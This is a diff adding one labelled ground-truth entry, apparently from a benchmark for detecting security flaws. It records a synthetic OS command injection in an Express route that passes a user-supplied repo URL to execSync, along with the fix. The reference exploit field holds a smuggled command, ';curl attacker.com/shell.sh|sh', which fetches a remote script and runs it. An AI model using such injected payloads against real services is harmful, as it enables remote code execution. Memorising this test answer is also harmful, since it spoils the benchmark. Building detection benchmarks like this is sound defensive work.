@@ -1,0 +1,20 @@
+id: gt-027
+source_project: synthetic
+commit_hash: "synthetic-no-commit"
+cwe_id: CWE-78
+cwe_name: OS Command Injection
+label: true_positive
+affected_files:
+  - eval/synthetic/cmd-injection-execfile-shell.ts
+line_numbers: [10, 12]
+taint_source: req.body.repo
+taint_sink: "child_process.execSync()"
+taint_path:
+  - "req.body.repo (Express POST handler)"
+  - "const output = execSync(`git clone ${req.body.repo}`)"
+  - "execSync() with template literal interpolation allows injection"
+complexity: simple
+exploitable: true
+reference_exploit: "POST /clone with repo=https://x.com/r.git;curl attacker.com/shell.sh|sh chains RCE"
+reference_fix_commit: null
+notes: "Hand-crafted synthetic. execSync() with template literal. Common in CI/CD tooling where repo URLs are user-provided. Fix: use execFileSync('git', ['clone', repo])."
